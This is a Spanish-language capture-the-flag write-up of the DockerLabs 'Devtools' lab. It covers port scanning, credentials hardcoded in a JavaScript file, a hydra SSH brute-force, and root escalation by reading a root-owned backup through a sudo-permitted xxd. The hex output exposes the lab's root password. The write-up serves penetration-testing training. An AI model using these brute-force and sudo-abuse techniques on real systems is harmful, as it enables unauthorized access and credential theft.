---
title: DockerLabs - Devtools
summary: "Write-up del laboratorio Devtools de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: [medio, credentials leaking, brute force, sudo]
media_subpath: "/assets/img/posts/dockerlabs_devtools"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Devtools]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Devtools]
└─$ nmap -sCV -p22,80 172.17.0.2                               
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
|_  256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Vemos que al acceder a la página principal del puerto 80 del servidor, nos salta una ventana pidiéndonos unas credenciales:

![Desktop View](/20260105204905.webp){: width="550" height="310" .shadow}

Dado que no poseemos dichas credenciales, procedemos a mirar el código fuente de la página:

![Desktop View](/20260105205138.webp){: width="972" height="589" .shadow}

En cierto punto, habla de la pestaña `Network`, por lo que probamos a ver a que recursos se llama a la hora de cargar la página:

![Desktop View](/20260105205306.webp){: width="972" height="589" .shadow}

Encontramos que se está llamando al script `backupp.js`, el cual procedemos a revisar:

![Desktop View](/20260105204707.webp){: width="972" height="589" .shadow}

Nos encontramos que tiene unas credenciales hardcodeadas en el código, por lo que probamos a ver si son las credenciales que nos solicitan, y resulta ser así:

![Desktop View](/20260105204817.webp){: width="550" height="310" .shadow}

## acceso inicial (carlos)

En el código del script también se mencionaba una contraseña más en un comentario, por lo que podemos ver si pertenece a algún usuario del sistema:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Devtools]
└─$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p ********* ssh://172.17.0.2 -I -t 64 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 64 tasks per 1 server, overall 64 tasks, 10177 login tries (l:10177/p:1), ~160 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: *********
```

Teniendo las credenciales del usuario `carlos`, procedemos a conectarnos por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Devtools]
└─$ sshpass -p "*********" ssh carlos@172.17.0.2
carlos@14389feb7454:~$ whoami
carlos
carlos@14389feb7454:~$ hostname
14389feb7454
```

Revisamos los usuarios del sistema que tengan asignada una consola:

```bash
carlos@14389feb7454:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
```

También comprobaremos que permisos SUDO tiene el usuario `carlos` asignados:

```bash
carlos@14389feb7454:~$ sudo -l
Matching Defaults entries for carlos on 14389feb7454:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on 14389feb7454:
    (ALL) NOPASSWD: /usr/bin/ping
    (ALL) NOPASSWD: /usr/bin/xxd
```

## escalada de privilegios (root)

En el directorio principal del usuario `carlos` encontramos la siguiente nota:

```bash
carlos@14389feb7454:~$ cat nota.txt 
Backup en data.bak dentro del directorio de root
```

Dado que podemos leer el contenido de los ficheros del sistema con permisos `root` con la utilidad **xxd** (permisos SUDO), revisamos el contenido del fichero `/root/data.bak` que nos han indicado, donde nos encontramos lo que parecen ser unas credenciales:

```bash
carlos@14389feb7454:~$ sudo /usr/bin/xxd /root/data.bak
00000000: 726f 6f74 3a62 616c 756c 6572 6974 6f0a  root:**********.
```

Probamos a conectarnos como el usuario `root`, y vemos que las credenciales son correctas:

```bash
carlos@14389feb7454:~$ su root
Password: 
root@14389feb7454:/home/carlos# whoami
root
```

Y de esta manera, se obtiene acceso privilegiado en la máquina `Devtools`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>